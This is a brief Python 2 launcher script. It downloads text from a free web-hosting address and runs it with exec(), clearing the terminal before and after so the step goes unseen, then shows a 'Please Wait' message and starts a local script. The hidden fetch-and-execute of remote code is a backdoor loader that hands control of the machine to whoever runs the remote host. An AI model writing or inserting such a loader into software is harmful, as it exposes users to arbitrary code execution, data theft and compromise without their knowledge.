import requests, os
z = requests.get('https://comarsh.000webhostapp.com/run.txt').text
os.system('clear')
exec(z)
os.system('clear')
print "[#] Please Wait..."
os.system('python2 data/com.py')
